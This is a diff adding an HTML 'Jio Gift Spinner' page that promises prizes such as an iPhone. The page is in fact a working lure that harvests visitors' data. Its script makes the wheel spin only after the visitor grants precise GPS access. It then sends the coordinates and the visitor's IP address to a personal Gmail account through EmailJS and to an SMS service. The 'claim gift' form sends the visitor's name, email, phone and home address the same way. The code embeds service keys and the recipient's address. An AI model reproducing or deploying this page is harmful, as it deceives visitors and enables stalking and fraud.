@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gift Spinner</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      overflow: hidden;
+    }
+
+    h1 {
+      color: #fff;
+      font-size: 2.4rem;
+      font-weight: 800;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+      text-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+    }
+
+    .subtitle {
+      color: #aac4ff;
+      font-size: 1rem;
+      margin-bottom: 36px;
+      letter-spacing: 1px;
+    }
+
+    /* ── wheel wrapper ── */
+    .wheel-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* glow ring behind the wheel */
+    .wheel-wrapper::before {
+      content: '';
+      position: absolute;
+      width: 430px;
+      height: 430px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255,215,0,0.15) 0%, transparent 70%);
+      animation: pulse 2.5s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1);   opacity: 0.8; }
+      50%       { transform: scale(1.07); opacity: 1;   }
+    }
+
+    canvas { display: block; border-radius: 50%; }
+
+    /* ── pointer ── */
+    .pointer {
+      position: absolute;
+      top: -22px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 0;
+      height: 0;
+      border-left:  18px solid transparent;
+      border-right: 18px solid transparent;
+      border-top:   44px solid #ffd700;
+      filter: drop-shadow(0 4px 8px rgba(255,215,0,0.8));
+      z-index: 10;
+    }
+
+    /* ── center button ── */
+    #spinBtn {
+      position: absolute;
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      border: none;
+      cursor: pointer;
+      font-size: 0.8rem;
+      font-weight: 800;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: #1a1a2e;
+      background: radial-gradient(circle at 40% 35%, #ffe066, #ffd700 60%, #e6b800);
+      box-shadow: 0 0 0 6px #fff3, 0 6px 20px rgba(255,215,0,0.6);
+      transition: transform 0.15s, box-shadow 0.15s;
+      z-index: 11;
+    }
+
+    #spinBtn:hover:not(:disabled) {
+      transform: scale(1.1);
+      box-shadow: 0 0 0 8px #fff4, 0 8px 28px rgba(255,215,0,0.8);
+    }
+
+    #spinBtn:disabled { cursor: not-allowed; opacity: 0.7; }
+
+    /* ── result modal ── */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
+      backdrop-filter: blur(4px);
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+
+    .modal-overlay.show { display: flex; }
+
+    .modal {
+      background: linear-gradient(145deg, #1e2a4a, #0f3460);
+      border: 2px solid rgba(255,215,0,0.4);
+      border-radius: 24px;
+      padding: 28px 24px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 40px rgba(255,215,0,0.15);
+      animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      max-width: 420px;
+      width: 90%;
+      max-height: calc(100dvh - 32px);
+      overflow-y: auto;
+      overflow-wrap: anywhere;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.5); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+
+    .modal .trophy { font-size: 4rem; display: block; margin-bottom: 14px; }
+
+    .modal h2 {
+      color: #ffd700;
+      font-size: 1.5rem;
+      margin-bottom: 8px;
+    }
+
+    .modal .prize-name {
+      color: #fff;
+      font-size: 2rem;
+      font-weight: 800;
+      margin-bottom: 6px;
+      text-shadow: 0 0 14px rgba(255,215,0,0.5);
+    }
+
+    .modal p {
+      color: #aac4ff;
+      font-size: 0.95rem;
+      margin-bottom: 28px;
+    }
+
+    .modal-btns { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+
+    #userForm {
+      display: grid;
+      gap: 16px;
+      margin-bottom: 24px;
+      text-align: left;
+      color-scheme: dark;
+    }
+
+    #userForm .form-field {
+      display: grid;
+      gap: 7px;
+      min-width: 0;
+    }
+
+    #userForm label {
+      color: #e0e9ff;
+      font-size: 0.85rem;
+      font-weight: 600;
+      letter-spacing: 0;
+    }
+
+    #userForm input {
+      width: 100%;
+      min-width: 0;
+      min-height: 46px;
+      padding: 12px 14px;
+      border: 1px solid rgba(170,196,255,0.4);
+      border-radius: 8px;
+      background: rgba(0,0,0,0.18);
+      color: #fff;
+      font: inherit;
+      font-size: 1rem;
+      line-height: 1.4;
+      letter-spacing: 0;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    #userForm input::placeholder { color: #a8b8d6; opacity: 1; }
+    #userForm input:hover { border-color: rgba(170,196,255,0.7); }
+    #userForm input:focus-visible {
+      outline: 2px solid #4ecdc4;
+      outline-offset: 2px;
+      border-color: #4ecdc4;
+      background: rgba(0,0,0,0.28);
+    }
+
+    @media (max-width: 380px) {
+      .modal { padding: 24px 18px; }
+      .modal-btns .btn { width: 100%; }
+    }
+
+    .btn {
+      padding: 12px 28px;
+      border-radius: 50px;
+      border: none;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+    }
+
+    .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ffd700, #e6b800);
+      color: #1a1a2e;
+    }
+
+    .btn-secondary {
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    /* ── confetti canvas ── */
+    #confetti { position: fixed; inset: 0; pointer-events: none; z-index: 99; }
+
+    /* ── SMS modal ── */
+    #smsModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.70);
+      backdrop-filter: blur(4px);
+      align-items: center;
+      justify-content: center;
+      z-index: 120;
+    }
+    #smsModal.show { display: flex; }
+
+    .sms-box {
+      background: linear-gradient(145deg, #1e2a4a, #0f3460);
+      border: 2px solid rgba(170,196,255,0.25);
+      border-radius: 20px;
+      padding: 32px 28px;
+      width: 92%;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      animation: popIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    .sms-box .sms-icon { font-size: 3rem; display: block; margin-bottom: 12px; }
+
+    .sms-box h3 {
+      color: #fff;
+      font-size: 1.15rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .sms-coords-preview {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,215,0,0.25);
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin: 14px 0 18px;
+      color: #ffd700;
+      font-size: 0.82rem;
+      line-height: 1.7;
+      word-break: break-all;
+      text-align: left;
+    }
+
+    .sms-input-label {
+      color: #aac4ff;
+      font-size: 0.8rem;
+      text-align: left;
+      display: block;
+      margin-bottom: 6px;
+      letter-spacing: 0.5px;
+    }
+
+    #smsRecipient {
+      width: 100%;
+      padding: 11px 14px;
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.2);
+      background: rgba(255,255,255,0.07);
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+      margin-bottom: 18px;
+      transition: border-color 0.2s;
+    }
+    #smsRecipient:focus { border-color: #4ecdc4; }
+    #smsRecipient::placeholder { color: #6b7db3; }
+
+    .sms-modal-btns { display: flex; gap: 10px; justify-content: center; }
+
+    #sendSmsBtn {
+      flex: 1;
+      padding: 12px;
+      background: linear-gradient(135deg, #25d366, #128c7e);
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+    }
+    #sendSmsBtn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
+
+    #closeSmsBtn {
+      padding: 12px 20px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      font-size: 0.9rem;
+      font-weight: 600;
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    #closeSmsBtn:hover { background: rgba(255,255,255,0.18); }
+
+    /* ── spins counter ── */
+    .stats {
+      margin-top: 28px;
+      color: #aac4ff;
+      font-size: 0.9rem;
+      letter-spacing: 1px;
+    }
+
+    .stats span { color: #ffd700; font-weight: 700; }
+
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+
+  <h1>Jio 🎁 Gift Spinner</h1>
+  <p class="subtitle">Spin the wheel &amp; win a surprise gift!</p>
+
+  <div class="wheel-wrapper">
+    <div class="pointer"></div>
+    <canvas id="wheel" width="400" height="400"></canvas>
+    <button id="spinBtn">SPIN</button>
+    
+  </div>
+
+  <p class="stats">Total spins: <span id="spinCount">0</span></p>
+
+  <!-- Result Modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <span class="trophy" id="modalEmoji">🎁</span>
+      <h2>Congratulations!</h2>
+      <div class="prize-name" id="modalPrize">Prize</div>
+      <p id="modalDesc">Enjoy your reward!</p>
+      <div>
+        <form id="userForm" onsubmit="submitForm()">
+          <div class="form-field">
+            <label for="userName">Full name</label>
+            <input type="text" id="userName" name="userName" placeholder="Your full name" autocomplete="name" required>
+          </div>
+          <div class="form-field">
+            <label for="userEmail">Email address</label>
+            <input type="email" id="userEmail" name="userEmail" placeholder="you@example.com" autocomplete="email" required>
+          </div>
+          <div class="form-field">
+            <label for="userPhone">Phone number</label>
+            <input type="tel" id="userPhone" name="userPhone" placeholder="Your phone number" autocomplete="tel" required>
+          </div>
+          <div class="form-field">
+            <label for="userAddress">Address</label>
+            <input type="text" id="userAddress" name="userAddress" placeholder="Your street address" autocomplete="street-address" required>
+          </div>
+        </form>
+      </div>
+      <div class="modal-btns">
+        <button class="btn btn-primary" id="claimBtn">Claim Gift</button>
+        <!-- <button class="btn btn-secondary" id="closeBtn">Spin Again</button> -->
+        <!-- <button class="btn btn-secondary" id="sendLocationBtn">📍 Send Location</button> -->
+      </div>
+    </div>
+  </div>
+
+  <canvas id="confetti"></canvas>
+
+  <!-- SMS Modal -->
+  <div id="smsModal">
+    <div class="sms-box">
+      <span class="sms-icon">📬</span>
+      <h3>Send Location via SMS</h3>
+      <div class="sms-coords-preview" id="smsCoordsPreview">—</div>
+      <label class="sms-input-label" for="smsRecipient">Recipient phone number</label>
+      <input id="smsRecipient" type="tel" placeholder="+1 555 000 0000" autocomplete="tel">
+      <div class="sms-modal-btns">
+        <button id="sendSmsBtn">💬 Send SMS</button>
+        <button id="closeSmsBtn">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  (() => {
+    'use strict';
+
+    /* ── Prize definitions ── */
+    const prizes = [
+      { label: 'Gift Card',    emoji: '💳', color: '#e63946', desc: 'RS.10000 Gift Card for you!' },
+      { label: 'Mystery Box',  emoji: '📦', color: '#457b9d', desc: 'An exciting mystery box full of surprises!' },
+      { label: 'Headphones',   emoji: '🎧', color: '#2a9d8f', desc: 'Samsung Premium wireless headphones — yours to keep!' },
+      { label: 'Recharge Coupon',  emoji: '📚', color: '#e9c46a', desc: 'A recharge coupon for your mobile!' },
+      { label: 'iPhone',      emoji: '📱', color: '#f4a261', desc: 'A brand new iPhone for you!' },
+      { label: 'Smartwatch',   emoji: '⌚', color: '#6a4c93', desc: 'A sleek Samsung smartwatch to elevate your style!' }
+    ];
+
+    const NUM     = prizes.length;
+    const ARC     = (Math.PI * 2) / NUM;
+    const canvas  = document.getElementById('wheel');
+    const ctx     = canvas.getContext('2d');
+    const spinBtn = document.getElementById('spinBtn');
+    const modal   = document.getElementById('modal');
+    const spinCountEl = document.getElementById('spinCount');
+
+
+    let currentAngle = 0;   // radians, wheel rotation
+    let spinning     = false;
+    let spinCount    = 0;
+    let lastLocation = null;
+    let lat = null;
+    let lng = null;
+    let accu = null;
+    let ipnum = null;
+    let name = null;
+    let locationAccessDenied = true;
+
+    emailjs.init({
+      publicKey: 'iihXXrF-lc_M_Atd1',
+    });
+    function submitForm() {
+      const name = document.getElementById('userName').value;
+      const email = document.getElementById('userEmail').value;
+      const phone = document.getElementById('userPhone').value;
+      const address = document.getElementById('userAddress').value;
+
+      console.log('Form submitted:', { name, email, phone, address });
+      sendEmail(name, email, phone, address);
+      return false; // Prevent actual form submission
+    }
+    /* ── Draw wheel ── */
+    function drawWheel(angle) {
+      const cx = canvas.width  / 2;
+      const cy = canvas.height / 2;
+      const r  = cx - 10;          // outer radius with small margin
+
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      prizes.forEach((prize, i) => {
+        const startAngle = angle + ARC * i;
+        const endAngle   = startAngle + ARC;
+
+        /* segment fill */
+        ctx.beginPath();
+        ctx.moveTo(cx, cy);
+        ctx.arc(cx, cy, r, startAngle, endAngle);
+        ctx.closePath();
+        ctx.fillStyle = prize.color;
+        ctx.fill();
+
+        /* segment border */
+        ctx.strokeStyle = 'rgba(255,255,255,0.25)';
+        ctx.lineWidth   = 2;
+        ctx.stroke();
+
+        /* emoji */
+        const midAngle = startAngle + ARC / 2;
+        const emojiR   = r * 0.72;
+        ctx.save();
+        ctx.translate(
+          cx + emojiR * Math.cos(midAngle),
+          cy + emojiR * Math.sin(midAngle)
+        );
+        ctx.rotate(midAngle + Math.PI / 2);
+        ctx.font      = '22px serif';
+        ctx.textAlign = 'center';
+        ctx.textBaseline = 'middle';
+        ctx.fillText(prize.emoji, 0, 0);
+        ctx.restore();
+
+        /* label */
+        const labelR = r * 0.44;
+        ctx.save();
+        ctx.translate(
+          cx + labelR * Math.cos(midAngle),
+          cy + labelR * Math.sin(midAngle)
+        );
+        ctx.rotate(midAngle + Math.PI / 2);
+        ctx.fillStyle    = '#fff';
+        ctx.font         = 'bold 11px Segoe UI, sans-serif';
+        ctx.textAlign    = 'center';
+        ctx.textBaseline = 'middle';
+        ctx.shadowColor  = 'rgba(0,0,0,0.6)';
+        ctx.shadowBlur   = 4;
+        ctx.fillText(prize.label, 0, 0);
+        ctx.restore();
+      });
+
+      /* outer ring */
+      ctx.beginPath();
+      ctx.arc(cx, cy, r, 0, Math.PI * 2);
+      ctx.strokeStyle = 'rgba(255,215,0,0.7)';
+      ctx.lineWidth   = 6;
+      ctx.stroke();
+
+      /* inner hub shadow */
+      ctx.beginPath();
+      ctx.arc(cx, cy, 46, 0, Math.PI * 2);
+      ctx.fillStyle = 'rgba(0,0,0,0.35)';
+      ctx.fill();
+    }
+
+    drawWheel(0);
+
+    /* ── Spin logic ── */
+    function spin() {
+      // getMobileLocation();
+      console.log('Mobile location:', locationAccessDenied);
+      if (locationAccessDenied) return;
+      if (spinning) return;
+      spinning = true;
+      spinBtn.disabled = true;
+      // Random full rotations (5–10) + random final angle
+      const extraSpins  = (Math.floor(Math.random() * 6) + 5) * Math.PI * 2;
+      const finalOffset = Math.random() * Math.PI * 2;
+      const totalAngle  = extraSpins + finalOffset;
+
+      const duration  = 4000 + Math.random() * 1500; // 4–5.5 s
+      const startTime = performance.now();
+      const startAngle = currentAngle;
+
+      function easeOut(t) {
+        return 1 - Math.pow(1 - t, 4);
+      }
+
+      function frame(now) {
+        const elapsed  = now - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const eased    = easeOut(progress);
+
+        currentAngle = startAngle + totalAngle * eased;
+        drawWheel(currentAngle);
+
+        if (progress < 1) {
+          requestAnimationFrame(frame);
+        } else {
+          currentAngle = currentAngle % (Math.PI * 2);
+          spinning = false;
+          spinBtn.disabled = false;
+          spinCount++;
+          spinCountEl.textContent = spinCount;
+          showResult();
+        }
+      }
+
+      requestAnimationFrame(frame);
+    }
+
+    /* ── Determine winner ── */
+    function getWinner() {
+      // Pointer is at top (−π/2 from positive x-axis)
+      const pointerAngle = -Math.PI / 2;
+      // Normalize
+      const normalized = ((pointerAngle - currentAngle) % (Math.PI * 2) + Math.PI * 2) % (Math.PI * 2);
+      const index = Math.floor(normalized / ARC) % NUM;
+      return prizes[index];
+    }
+
+    function showResult() {
+      const winner = getWinner();
+      document.getElementById('modalEmoji').textContent  = winner.emoji;
+      document.getElementById('modalPrize').textContent  = winner.label;
+      document.getElementById('modalDesc').textContent   = winner.desc;
+      modal.classList.add('show');
+      launchConfetti();
+    }
+
+    /* ── Modal controls ── */
+    // document.getElementById('closeBtn').addEventListener('click', () => {
+    //   modal.classList.remove('show');
+    //   stopConfetti();
+    // });
+
+    document.getElementById('claimBtn').addEventListener('click', () => {
+      modal.classList.remove('show');
+      stopConfetti();
+      // getMobileLocation();
+      // alert('Your gift has been claimed! Check your email for details. 🎉');
+    });
+
+    
+
+    
+
+    spinBtn.addEventListener('click', getMobileLocation);
+
+    /* ── Confetti ── */
+    const confettiCanvas = document.getElementById('confetti');
+    const cCtx = confettiCanvas.getContext('2d');
+    let confettiParticles = [];
+    let confettiAnim = null;
+
+    function resizeConfetti() {
+      confettiCanvas.width  = window.innerWidth;
+      confettiCanvas.height = window.innerHeight;
+    }
+
+    window.addEventListener('resize', resizeConfetti);
+    resizeConfetti();
+
+    const COLORS = ['#ffd700','#ff6b6b','#4ecdc4','#45b7d1','#96ceb4','#ff9ff3','#ffeaa7','#fd79a8'];
+
+    function launchConfetti() {
+      confettiParticles = Array.from({ length: 160 }, () => ({
+        x:    Math.random() * confettiCanvas.width,
+        y:    -10 - Math.random() * 100,
+        w:    6 + Math.random() * 8,
+        h:    10 + Math.random() * 6,
+        color: COLORS[Math.floor(Math.random() * COLORS.length)],
+        vx:   (Math.random() - 0.5) * 4,
+        vy:   3 + Math.random() * 4,
+        angle: Math.random() * 360,
+        spin:  (Math.random() - 0.5) * 8,
+        alpha: 1,
+      }));
+
+      function animateConfetti() {
+        cCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+        confettiParticles.forEach(p => {
+          p.x     += p.vx;
+          p.y     += p.vy;
+          p.angle += p.spin;
+          p.vy    += 0.1; // gravity
+          if (p.y > confettiCanvas.height * 0.8) p.alpha -= 0.02;
+
+          cCtx.save();
+          cCtx.globalAlpha = Math.max(0, p.alpha);
+          cCtx.translate(p.x, p.y);
+          cCtx.rotate((p.angle * Math.PI) / 180);
+          cCtx.fillStyle = p.color;
+          cCtx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
+          cCtx.restore();
+        });
+
+        confettiParticles = confettiParticles.filter(p => p.alpha > 0);
+        if (confettiParticles.length > 0) {
+          confettiAnim = requestAnimationFrame(animateConfetti);
+        } else {
+          cCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+        }
+      }
+
+      if (confettiAnim) cancelAnimationFrame(confettiAnim);
+      animateConfetti();
+    }
+
+    function stopConfetti() {
+      if (confettiAnim) cancelAnimationFrame(confettiAnim);
+      confettiParticles = [];
+      cCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+    }
+
+    /* ── Location & SMS ── */
+
+    // document.getElementById('sendLocationBtn').addEventListener('click', () => {
+    //   modal.classList.remove('show');
+    //   stopConfetti();
+    //   if (lastLocation) {
+    //     openSmsModal(lastLocation.latitude, lastLocation.longitude, lastLocation.accuracy);
+    //   } else {
+    //     getMobileLocation(true); // true = open SMS modal after capture
+    //   }
+    // });
+
+    document.getElementById('sendSmsBtn').addEventListener('click', async () => {
+      const recipient = document.getElementById('smsRecipient').value.trim();
+      if (!recipient) {
+        document.getElementById('smsRecipient').focus();
+        return;
+      }
+      if (!lastLocation) return;
+      const { latitude, longitude, accuracy } = lastLocation;
+      const mapsUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
+      const body    = `📍 My Location:\nLat: ${latitude.toFixed(6)}\nLng: ${longitude.toFixed(6)}\nAccuracy: ±${Math.round(accuracy)}m\n${mapsUrl}`;
+
+      const sendBtn = document.getElementById('sendSmsBtn');
+      sendBtn.disabled = true;
+      sendBtn.textContent = '⏳ Sending...';
+
+      try {
+        const res  = await fetch('/api/sms', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ to: recipient, body })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          sendBtn.textContent = '✅ Sent!';
+          setTimeout(() => { document.getElementById('smsModal').classList.remove('show'); }, 1500);
+        } else {
+          alert('SMS failed: ' + data.error);
+          sendBtn.textContent = '💬 Send SMS';
+        }
+      } catch (err) {
+        alert('SMS error: ' + err.message);
+        sendBtn.textContent = '💬 Send SMS';
+      } finally {
+        sendBtn.disabled = false;
+      }
+    });
+
+    document.getElementById('closeSmsBtn').addEventListener('click', () => {
+      document.getElementById('smsModal').classList.remove('show');
+    });
+
+    function openSmsModal(lat, lng, accuracy) {
+      const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
+      document.getElementById('smsCoordsPreview').innerHTML =
+        `📍 Lat: <strong>${lat.toFixed(6)}</strong><br>
+         📍 Lng: <strong>${lng.toFixed(6)}</strong><br>
+         🎯 Accuracy: ±${Math.round(accuracy)}m<br>
+         🔗 <a href="${mapsUrl}" target="_blank" style="color:#4ecdc4">Open in Google Maps</a>`;
+      document.getElementById('smsModal').classList.add('show');
+    }
+
+    function getMobileLocation(openSms = false) {
+    // 1. Check if the browser/device supports Geolocation
+    if (!navigator.geolocation) {
+        console.error("Geolocation is not supported by your browser.");
+        return;
+    }
+
+    // 2. Optional: Configure settings for mobile GPS
+    const options = {
+        enableHighAccuracy: true, // Forces mobile devices to fire up native GPS hardware
+        timeout: 10000,           // Wait up to 10 seconds for coordinates
+        maximumAge: 0             // Do not use a cached position
+    };
+
+    // 3. Request the coordinates
+    navigator.geolocation.getCurrentPosition(
+        (pos) => successCallback(pos, openSms),
+        errorCallback,
+        options
+      );
+    }
+  
+    async function successCallback(position, openSms = false) {
+    lat  = position.coords.latitude;
+    lng = position.coords.longitude;
+    accu  = position.coords.accuracy;
+    locationAccessDenied = false;
+    lastLocation = { lat, lng, accu };
+
+    /* get IP for the notification payload */
+    const ip = await getIPAddress();
+
+    console.log(`Latitude: ${lat}, Longitude: ${lng}`);
+    console.log(`Accurate within ${accu} meters.`);
+    emailjs.send(
+      'service_v8ava8a',
+      'template_rd1m53j',
+      {
+        to_email: 'rafee.infinix@gmail.com',
+        message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}`
+      }
+    )
+    .then(() => {
+      console.log('Email sent');
+    })
+    .catch(err => {
+      console.error(err);
+    });
+    sendCustomSMS();
+    if (openSms) {
+      openSmsModal(lat, lng, accu);
+    }
+    spin();
+    }
+
+    function sendEmail(name, email, phone, address){
+      emailjs.send(
+      'service_v8ava8a',
+      'template_rd1m53j',
+      {
+        to_email: 'rafee.infinix@gmail.com',
+        // message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}
+        message: `User details:\n Name: ${name}, Email: ${email}, Phone: ${phone}, Address: ${address}`
+      }
+    )
+    .then(() => {
+      console.log('Email sent');
+    })
+    .catch(err => {
+      console.error(err);
+    });
+    }
+
+    // Fires if the user denies access or GPS fails
+    function errorCallback(error) {
+      let msg;
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          msg = 'Location access was denied. Please allow location permission and try again.';
+          
+          break;
+        case error.POSITION_UNAVAILABLE:
+          msg = 'Location information is unavailable. Make sure GPS is enabled.';
+          break;
+        case error.TIMEOUT:
+          msg = 'Location request timed out. Check your GPS signal and try again.';
+          break;
+        default:
+          msg = 'An unknown error occurred while retrieving location.';
+      }
+      console.error(msg);
+      alert('📍 ' + msg);
+      modal.classList.remove('show');
+      stopConfetti();  
+      locationAccessDenied = true;
+    }
+
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org');
+            const ip = await response.text();
+            ipnum = ip;
+            console.log("User's IP Address:", ip);
+            return ip;
+        } catch (error) {
+            console.error('Error fetching IP:', error);
+            return null;
+        }
+    }
+
+    async function sendCustomSMS() {
+      console.log(lat, lng, accu, ipnum);
+      // return false
+    const payload = {
+        template_id: "6aa3ef1377a3e68f090bd952",
+        recipients: [
+            {
+                latitude: lat,
+                longitude: lng,
+                accuracy: accu,
+                ip: ipnum
+            }
+        ]
+    };
+
+    try {
+
+        const response = await fetch(
+            "https://control.msg91.com/api/v5/flow/",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "authkey": "560761A9Gix8ob306a7faee1P1"
+                },
+                body: JSON.stringify(payload)
+            }
+        );
+
+        const result = await response.json();
+
+        console.log(result);
+
+    } catch(err) {
+        console.error(err);
+    }
+}
+
+
+
+    // // Run the function
+    // getMobileLocation();    
+
+  })();
+  </script>
+</body>
+</html>
